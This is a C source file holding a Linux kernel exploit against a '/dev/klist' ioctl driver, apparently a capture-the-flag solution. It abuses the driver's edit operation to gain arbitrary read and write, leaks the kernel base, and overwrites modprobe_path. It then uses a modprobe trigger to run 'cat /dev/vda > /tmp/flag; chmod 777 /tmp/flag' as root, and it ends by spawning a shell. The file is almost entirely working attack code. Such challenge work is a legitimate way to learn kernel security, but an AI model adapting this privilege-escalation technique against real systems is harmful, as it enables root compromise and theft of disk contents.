#include "libpwn.c"

#define DEVICE "/dev/klist"
#define KLIST_IOCTL_ADD  _IOW('k', 0, struct add_req)
#define KLIST_IOCTL_EDIT _IOW('k', 1, struct edit_req)
#define KLIST_IOCTL_SHOW _IOWR('k', 2, struct show_req)
#define DATA_SZ 0x60
#define MAX_NODE 10

#define SPRAY_WIDTH 30
#define KOBJ_SIZE 0x1000
#define MSG_SIZE (KOBJ_SIZE - 0x30)
#define EGG 0x4141414141414100

struct add_req {
    char buf[DATA_SZ];       /* data to add to list */
};

struct edit_req {
    uint32_t idx;            /* index of node to edit */
	uint32_t sz;			/* how much data copied */
    char buf[DATA_SZ];       /* data to append/overwrite from pos */
};

struct show_req {
    uint32_t idx;            /* index of node to show */
    char buf[DATA_SZ];       /* out: kernel will fill this and copy back */
};

char buffer[1024*2];
int fd;

void ioctl_add() {
    if (ioctl(fd, KLIST_IOCTL_ADD, &buffer) < 0) error("KLIST_IOCTL_ADD");
}

void ioctl_edit(u64 idx, u64 size) {
    struct edit_req req = {
        .idx = idx,
        .sz = size
    };
    memcpy(req.buf, buffer, DATA_SZ);
    if (ioctl(fd, KLIST_IOCTL_EDIT, &req) < 0) error("KLIST_IOCTL_EDIT");
}

void ioctl_show(u64 idx) {
    struct show_req req = {
        .idx = idx,
    };
    if (ioctl(fd, KLIST_IOCTL_SHOW, &req) < 0) error("KLIST_IOCTL_SHOW");
    memcpy(buffer, req.buf, DATA_SZ);
}

void fill_buf_value(u64 val) {
    for(int i = 0; i < sizeof(buffer)/0x8; i++) {
        ((u64 *)buffer)[i] = val;
    }
}

int main() {
    fd = open(DEVICE, O_RDWR);
    if (fd < 0) {
        panic("open");
    }

    fill_buf_value(EGG+0x1);
    ((u64 *)buffer)[11] = 0x0;
    ioctl_add();

    fill_buf_value(EGG+0x2);
    ((u64 *)buffer)[11] = 0x0;
    ioctl_add();

    fill_buf_value(0x0);
    ((u64 *)buffer)[1] = 0xfffffe0000000000+0x4;
    ioctl_edit(0, 0x10);
    
    fill_buf_value(0x0);
    ioctl_show(0x1);
    // dump_hex(buffer, 0x40);
    
    kbase = ((u64 *)buffer)[0] - 0x1008e00;
    u64 modprobe_path = kbase + 0x1b426e0; 
    info2("kernel base", kbase);
    info2("modprobe path", modprobe_path);

    fill_buf_value(0x0);
    ((u64 *)buffer)[1] = modprobe_path;
    ioctl_edit(0, 0x10);

    fill_buf_value(0x0);
    memcpy(buffer, DEFAULT_EVIL_MODPROBE_PATH, sizeof(DEFAULT_EVIL_MODPROBE_PATH));
    ioctl_edit(1, sizeof(DEFAULT_EVIL_MODPROBE_PATH));

    modprobe_attack("cat /dev/vda > /tmp/flag; chmod 777 /tmp/flag", NULL, NULL);
    
    system("/bin/sh");
    _pause_("end of exploit...");
}